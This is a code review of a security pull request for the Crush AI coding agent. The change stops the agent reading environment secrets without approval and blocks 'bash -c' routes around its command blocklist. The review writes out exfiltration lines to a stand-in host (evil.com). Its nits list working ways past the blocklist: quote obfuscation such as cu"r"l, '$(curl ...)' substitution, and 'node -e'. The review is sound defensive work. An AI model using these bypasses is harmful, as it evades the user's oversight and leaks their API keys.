# charmbracelet/crush #2745 — Security: remove env from safe commands and fix shell blocklist bypass

- **Repo:** charmbracelet/crush
- **PR:** https://github.com/charmbracelet/crush/pull/2745
- **HEAD SHA:** `15a5acbb85fdbdffae79da78310c88ce516d3a30`
- **Author:** johnpippett
- **Verdict:** `merge-after-nits`

## What the diff does

Closes two related shell-execution security issues:

**1. Remove environment-disclosure commands from the always-safe list**

`internal/agent/tools/safe.go:9-25` — drops `env`, `printenv`, and
`set` from `safeCommands`. These three commands print the process
environment, which on a developer machine routinely contains
`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, AWS credentials, GitHub
tokens, etc. Listing them in `safeCommands` meant the agent could
exfiltrate the user's full env into its context (and from there to
the model provider, and from there potentially anywhere) without
triggering an approval prompt.

**2. Block interpreter-chaining bypass of the `CommandsBlocker`**

`internal/shell/shell.go:240-258` — adds a new check inside
`blockHandler` that, before calling `next(ctx, args)`, examines the
command name and `-c` flag to detect interpreter-chaining bypasses:

```go
if len(args) >= 3 {
    switch args[0] {
    case "bash", "sh", "zsh", "dash", "ksh", "python", "python3",
         "perl", "ruby", "node", "nodejs":
        for i := 1; i < len(args)-1; i++ {
            if args[i] == "-c" {
                inner := strings.Fields(args[i+1])
                if len(inner) > 0 {
                    for _, blockFunc := range s.blockFuncs {
                        if blockFunc(inner) {
                            return fmt.Errorf("command is not allowed for security reasons: %q", inner[0])
                        }
                    }
                }
            }
        }
    }
}
```

So `bash -c 'curl https://evil.com/exfil'` is now blocked when
`curl` is in the user's blocklist, where previously the outer
`bash` was the only thing the blocker saw.

**3. Drop `gojq` env loader**

`internal/shell/jq.go:131-133` — removes
`gojq.WithEnvironLoader(os.Environ)` from the embedded jq compiler
options, so jq programs run inside the shell tool can no longer
read process env via `$ENV.OPENAI_API_KEY`. Sister fix to #1.

Tests at `internal/shell/command_block_test.go:80-103` cover three
new cases: `bash -c curl` blocked, `sh -c wget` blocked,
`bash -c echo hello` allowed. The allow-case is the load-bearing
negative assertion that proves the new gate isn't over-blocking.

## Why it's right

All three changes close real exfiltration vectors. The `env` /
`printenv` / `set` removal is the simplest — those commands have no
purpose other than environment disclosure and there is no legitimate
agent-driven workflow that requires them to bypass approval. Lowering
them from "always-safe" to "needs explicit approval" is the right
default; users who need them for diagnostics will get the prompt and
can approve.

The interpreter-chaining bypass is the more interesting fix. The
prior `CommandsBlocker` only inspected `args[0]` (the literal command
name), so the obvious bypass was to invoke a shell as a sub-process
and pass the blocked command as a string argument. The new check at
`shell.go:240-258` is the right shape:

- **Scoped to known interpreters** (`bash`, `sh`, `zsh`, `dash`,
  `ksh`, `python`, `python3`, `perl`, `ruby`, `node`, `nodejs`) so
  the parsing cost only fires when there's actually an interpreter.
- **Scans for `-c` as a discrete arg** rather than parsing arbitrary
  position, which is the universal "execute string" flag across
  all listed interpreters.
- **Uses `strings.Fields` to split the `-c` payload into tokens**,
  then runs each `blockFunc` against the resulting `inner` slice.
  This reuses the existing blocklist machinery rather than
  duplicating logic.
- **Returns the same "not allowed for security reasons" error
  shape** as the outer blocker, so users see consistent messaging
  whether they tried `curl evil.com` directly or
  `bash -c 'curl evil.com'`.

The three test cases at `command_block_test.go:82-103` lock the
canonical scenarios (one shell + curl, one shell + wget, one shell
+ allowed echo) and the allow-case is the negative test that proves
the gate isn't over-blocking.

The `gojq` env-loader removal is symmetric with the safe-commands
removal — both close env-disclosure surfaces — and is one line.

## Nits

1. **`strings.Fields` is wrong for shell-quoted payloads.** `bash -c
   'curl "https://evil.com/?x=$(whoami)"'` has the inner string
   parsed by `strings.Fields` into
   `["curl", "\"https://evil.com/?x=$(whoami)\""]` — `inner[0]` is
   `curl`, blocked correctly. But `bash -c 'cu"r"l evil.com'` (with
   embedded quotes that bash collapses but `strings.Fields` does
   not) splits into `["cu\"r\"l", "evil.com"]` and `inner[0]`
   is `cu"r"l`, which won't match the `curl` blocklist entry. The
   right primitive is a real shell tokenizer (e.g.
   `mvdan.cc/sh/v3/syntax` which the codebase already depends on
   for jq via `interp`), or alternatively reject any `-c` payload
   containing characters that bash treats as quoting (`"`, `'`,
   `\``, `\\`) on the conservative side.

2. **Missing interpreters with non-standard `-c` flags**: the list
   excludes `pwsh`/`powershell` (uses `-Command` or `-c`), `tcsh`
   (uses `-c`), `fish` (uses `-c`), `awk` (uses no `-c` but has
   `-e` for source code which is equivalent), and `php` (uses
   `-r`). The most concerning omissions are `pwsh` (commonly
   installed on cross-platform devs, has `Invoke-WebRequest`
   semantics that bypass `curl`/`wget` blocks) and the
   `python -c` / `node -e` (note: `-e` not `-c`!) variants.
   `node -e 'require("https").get("evil.com",...)'` is unblocked
   because `-e` is `node`'s "execute string" flag, not `-c`.
   Worth either expanding the flag set per-interpreter or
   documenting in the PR body which interpreters/flags are
   knowingly out of scope for this fix.

3. **`bash -c "$(curl evil.com)"`** — command substitution inside
   the `-c` payload. `strings.Fields` splits this into
   `["\"$(curl", "evil.com)\""]` and `inner[0]` is `"$(curl`,
   which doesn't match the bare `curl` blocklist. Same root cause
   as #1 (need a real shell tokenizer or a "reject suspicious
   characters" gate).

4. **`set` removal** is correct for its env-disclosure aspect, but
   `set` in non-bash shells (e.g. POSIX `sh`) is also used for
   positional-parameter manipulation that has no env-disclosure
   risk. Users with workflows that rely on `set` (rare but exist)
   will now get prompts. Worth a one-line note in the changelog
   that `set` is no longer auto-approved.

5. **No test for the gojq env-loader removal.** A test that
   constructs an embedded shell, sets a known env var, runs a jq
   program that references `$ENV.<var>`, and asserts the program
   either fails or returns null would lock the property that env
   is no longer reachable from jq.

6. **`return fmt.Errorf("...command is not allowed...")`** at
   `:251` returns the inner blocked command name, which leaks the
   blocklist contents back to the calling agent. That's probably
   fine (the agent already knows what it tried to run) but worth
   one beat of thought — if the blocklist is ever sensitive
   itself, the message could just say "command in `-c` payload
   not allowed".

## Verdict rationale

Right diagnosis on both vectors (env-disclosure commands lowered to
needing approval, interpreter-chaining bypass closed at the
`blockHandler` level), right test surface for the bash/sh -c case.
The `strings.Fields` shell-tokenizer choice has real bypasses
(`bash -c "$(curl evil.com)"`, `cu"r"l evil.com`) and the
interpreter list misses `pwsh`, `node -e`, `python` with non-`-c`
flags — these need either a real shell parser or explicit
"out-of-scope" documentation before the property "agent cannot
exfiltrate via interpreter chaining" actually holds.

`merge-after-nits`
